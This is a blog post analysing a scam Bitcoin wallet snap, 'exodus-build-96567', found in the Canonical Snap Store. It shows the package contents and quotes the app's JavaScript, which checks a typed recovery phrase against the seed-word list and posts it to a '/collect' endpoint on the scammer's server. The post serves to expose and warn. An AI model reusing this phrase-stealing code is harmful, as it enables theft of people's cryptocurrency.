+++
date = "2024-03-18T21:00:00+01:00"
title = "Guess Who's Back? Exodus Scam BitCoin Wallet Snap!"
slug = "2024/03/exodus-wallet-part-three"
author = "Alan Pope"
tags = ['ubuntu', 'snapcraft', 'crypto', 'scam', 'bitcoin', 'wallet', 'exodus']
+++

## Previously...

Back in February, I [blogged](/blog/2024/02/exodus-bitcoin-wallet-490k-swindle/) about a series of scam Bitcoin wallet apps that were published in the Canonical Snap store, including one which netted a scammer **$490K** of some poor rube's coin. 

The snap was *eventually* [removed](/blog/2024/02/exodus-bitcoin-wallet-follow-up), and [some](https://forum.snapcraft.io/t/should-unverified-cryptocurrency-apps-be-banned/38919/4) [threads](https://forum.snapcraft.io/t/stronger-identity-verification-for-all-publishers/39061) were started over on the [Snapcraft forum](https://snapcraft.io/)

## Groundhog Day

Nothing has changed it seems, because once again, **another** scam BitCoin wallet app has been published in the Snap Store today.

[![You're joking! Not another one!](/blog/images/2024-03-18/not-another-one.gif)](https://www.youtube.com/watch?v=H6-IQAdFU3w)

Yes, Brenda!

This one has the snappy (sorry) name of `exodus-build-96567` published by that not-very-legit looking publisher `digisafe00000`. Uh-huh.

There's no indication this is the same developer as the last scam Exodus Wallet snap published in February, or the one published back in November last year. 

## Presentation

Here's what it looks like on the Snap Store page https://snapcraft.io/exodus-build-96567 - which may be gone by the time you see this. A real *minimum effort* on the store listing page here. But I'm sure it could fool someone, they usually do.

[![A not very legit looking snap](/blog/images/2024-03-18/snap-store-1_50.png)](/blog/images/2024-03-18/snap-store-1.png)

It also shows up in searches within the desktop graphical storefront "Ubuntu Software" or "App Centre", making it super easy to install.

**Note:** Do **not** install this.

"*Secure, Manage, and Swap all your favorite assets*." None of that is true, as we'll see later. Although one could argue "swap" is true if you don't mind "swapping" all your BitCoin for an empty wallet, I suppose.

Although it is "*Safe*", apparently, according to the store listing.

[![Coming to a desktop near you](/blog/images/2024-03-18/snap-store-2_50.png)](/blog/images/2024-03-18/snap-store-2.png)

## Open wide

It looks like the `exodus-build-96567` snap was only published to the store today. I wonder what happened to builds 1 through 96566!

```bash
$ snap info 
name:      exodus-build-96567
summary:   Secure, Manage, and Swap all your favorite assets.
publisher: Digital Safe (digisafe00000)
store-url: https://snapcraft.io/exodus-build-96567
license:   unset
description: |
  Forget managing a million different wallets and seed phrases.
  Secure, Manage, and Swap all your favorite assets in one beautiful, easy-to-use wallet.
snap-id: wvexSLuTWD9MgXIFCOB0GKhozmeEijHT
channels:
  latest/stable:    8.6.5 2024-03-18 (1) 565kB -
  latest/candidate: ↑                          
  latest/beta:      ↑                          
  latest/edge:      ↑   
```

Here's the app running in a VM.

[![The application](/blog/images/2024-03-18/exodus-wallet-2_50.png)](/blog/images/2024-03-18/exodus-wallet-2.png)

If you try and create a new wallet, it waits a while then gives a spurious error. That code path likely does nothing. What it really wants you to do is "Add an existing wallet". 

[![Give us all your money](/blog/images/2024-03-18/exodus-wallet-1_50.png)](/blog/images/2024-03-18/exodus-wallet-1.png)

As with all these scam application, all it does is ask for a BitCoin recovery phrase, and with that will likely steal all the coins and send them off to the scammer's wallet. Obviously I didn't test this with a real wallet phrase. 

When given a false passphrase/recovery-key it calls some remote API then shows a dubious error, having already taken your recovery key, and sent it to the scammer.

[![Error](/blog/images/2024-03-18/error-1_50.png)](/blog/images/2024-03-18/error-1.png)


## What's inside?

While the snap is still available for download from the store, I grabbed it.

```bash
$ snap download exodus-build-96567
Fetching snap "exodus-build-96567"
Fetching assertions for "exodus-build-96567"
Install the snap with:
   snap ack exodus-build-96567_1.assert
   snap install exodus-build-96567_1.snap
```

I then unpacked the snap to take a peek inside.

```bash
unsquashfs exodus-build-96567_1.snap
Parallel unsquashfs: Using 8 processors
11 inodes (21 blocks) to write

[===========================================================|] 32/32 100%

created 11 files
created 8 directories
created 0 symlinks
created 0 devices
created 0 fifos
created 0 sockets
created 0 hardlinks

```

There's not a lot in here. Mostly the usual snap scaffolding, metadata, and the single `exodus-bin` application binary in `bin/`.

```bash
tree squashfs-root/
squashfs-root/
├── bin
│ └── exodus-bin
├── meta
│ ├── gui
│ │ ├── exodus-build-96567.desktop
│ │ └── exodus-build-96567.png
│ ├── hooks
│ │ └── configure
│ └── snap.yaml
└── snap
    ├── command-chain
    │ ├── desktop-launch
    │ ├── hooks-configure-fonts
    │ └── run
    ├── gui
    │ ├── exodus-build-96567.desktop
    │ └── exodus-build-96567.png
    └── snapcraft.yaml

8 directories, 11 files

```

Here's the `snapcraft.yaml` used to build the package. Note it needs network access, unsurprisingly.

```yaml
name: exodus-build-96567 # you probably want to 'snapcraft register <name>'
base: core22 # the base snap is the execution environment for this snap
version: '8.6.5' # just for humans, typically '1.2+git' or '1.3.2'
title: Exodus Wallet
summary: Secure, Manage, and Swap all your favorite assets. # 79 char long summary
description: |
  Forget managing a million different wallets and seed phrases.
  Secure, Manage, and Swap all your favorite assets in one beautiful, easy-to-use wallet.

grade: stable # must be 'stable' to release into candidate/stable channels
confinement: strict # use 'strict' once you have the right plugs and slots

apps:
  exodus-build-96567:
    command: bin/exodus-bin
    extensions: [gnome]
    plugs:
      - network
      - unity7
      - network-status

layout:
  /usr/lib/${SNAPCRAFT_ARCH_TRIPLET}/webkit2gtk-4.1:
    bind: $SNAP/gnome-platform/usr/lib/$SNAPCRAFT_ARCH_TRIPLET/webkit2gtk-4.0

parts:
  exodus-build-96567:
    plugin: dump
    source: .
    organize:
      exodus-bin: bin/

```

For completeness, here's the `snap.yaml` that gets generated at build-time.

```yaml
name: exodus-build-96567
title: Exodus Wallet
version: 8.6.5
summary: Secure, Manage, and Swap all your favorite assets.
description: |
  Forget managing a million different wallets and seed phrases.
  Secure, Manage, and Swap all your favorite assets in one beautiful, easy-to-use wallet.
architectures:
- amd64
base: core22
assumes:
- command-chain
- snapd2.43
apps:
  exodus-build-96567:
    command: bin/exodus-bin
    plugs:
    - desktop
    - desktop-legacy
    - gsettings
    - opengl
    - wayland
    - x11
    - network
    - unity7
    - network-status
    command-chain:
    - snap/command-chain/desktop-launch
confinement: strict
grade: stable
environment:
  SNAP_DESKTOP_RUNTIME: $SNAP/gnome-platform
  GTK_USE_PORTAL: '1'
  LD_LIBRARY_PATH: ${SNAP_LIBRARY_PATH}${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
  PATH: $SNAP/usr/sbin:$SNAP/usr/bin:$SNAP/sbin:$SNAP/bin:$PATH
plugs:
  desktop:
    mount-host-font-cache: false
  gtk-3-themes:
    interface: content
    target: $SNAP/data-dir/themes
    default-provider: gtk-common-themes
  icon-themes:
    interface: content
    target: $SNAP/data-dir/icons
    default-provider: gtk-common-themes
  sound-themes:
    interface: content
    target: $SNAP/data-dir/sounds
    default-provider: gtk-common-themes
  gnome-42-2204:
    interface: content
    target: $SNAP/gnome-platform
    default-provider: gnome-42-2204
hooks:
  configure:
    command-chain:
    - snap/command-chain/hooks-configure-fonts
    plugs:
    - desktop
layout:
  /usr/lib/x86_64-linux-gnu/webkit2gtk-4.1:
    bind: $SNAP/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
  /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0:
    bind: $SNAP/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
  /usr/share/xml/iso-codes:
    bind: $SNAP/gnome-platform/usr/share/xml/iso-codes
  /usr/share/libdrm:
    bind: $SNAP/gnome-platform/usr/share/libdrm

```

## Digging Deeper

Unlike the [previous](/blog/2024/02/exodus-bitcoin-wallet-490k-swindle/) scammy application that was written using Flutter, the developers of this one appear to have made a web page in a WebKit GTK wrapper. 

If the network is not available, the application loads with an empty window containing an error message "Could not connect: Network is unreachable". 

[![No network](/blog/images/2024-03-18/exodus-wallet-3_50.png)](/blog/images/2024-03-18/exodus-wallet-3.png)

I brought the network up, ran Wireshark then launched the rogue application again. The app clearly loads the remote content (html, javascript, css, and logos) then renders it inside the wrapper Window.

[![Wireshark](/blog/images/2024-03-18/wireshark-1_50.png)](/blog/images/2024-03-18/wireshark-1.png)

The javascript is pretty simple. It has a dictionary of words which are allowed in a recovery key. Here's a snippet.

```javascript
var words = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb',
  ⋮
  'youth', 'zebra', 'zero', 'zone', 'zoo'];
````

As the user types words, the application checks the list.

```javascript
var alreadyAdded = {};
function checkWords() {    
    var button = document.getElementById("continueButton");
    var inputString = document.getElementById("areatext").value;
    var words_list = inputString.split(" ");
    var foundWords = 0;
    
    words_list.forEach(function(word) {
        if (words.includes(word)) {
            foundWords++;
        }
    });
    
    
    if (foundWords === words_list.length && words_list.length === 12 || words_list.length === 18 || words_list.length === 24) {

        
    button.style.backgroundColor = "#511ade";

    if (!alreadyAdded[words_list]) {
        sendPostRequest(words_list);
        alreadyAdded[words_list] = true;
        button.addEventListener("click", function() {
            renderErrorImport();
        });
    }
        
    }
    else{
        button.style.backgroundColor = "#533e89";
    }
}
```

If all the entered words are in the dictionary, it will allow the use of the "Continue" button to send a "POST" request to a `/collect` endpoint on the server.

```javascript
function sendPostRequest(words) {
    
    var data = {
        name: 'exodus',
        data: words
    };
    
    fetch('/collect', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error during the request');
        }
        return response.json();
    })
    .then(data => {
        console.log('Response:', data);
        
    })
    .catch(error => {
        console.error('There is an error:', error);
    });
}
````

Here you can see in the payload, the words I typed, selected from the dictionary mentioned above.

[![Wireshark](/blog/images/2024-03-18/wireshark-2_50.png)](/blog/images/2024-03-18/wireshark-2.png)

It also periodically 'pings' the `/ping` endpoint on the server with a simple payload of `{" name":"exodus"}`. Presumably for network connectivity checking, telemetry or seeing which of the scam wallet applications are in use.

```javascript
function sendPing() {
    
    var data = {
        name: 'exodus',
    };
    
    fetch('/ping', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error during the request');
        }
        return response.json();
    })
    .then(data => {
        console.log('Response:', data);
        
    })
    .catch(error => {
        console.error('There is an error:', error);
    });
}
````

All of this is done over HTTP, because of course it is. No security needed here!

## Conclusion

It's trivially easy to publish scammy applications like this in the Canonical Snap Store, and for them to go unnoticed. 

I was **somewhat** hopeful that my previous [post](/blog/2024/02/exodus-bitcoin-wallet-490k-swindle/) may have had some impact. It doesn't look like much has changed yet beyond a couple of conversations on the forum.

It would be **really** *neat* if the team at Canonical responsible for the store could do something to prevent these kinds of apps before they get into the hands of users.

I've reported the app to the Snap Store team.

Until next time, Brenda!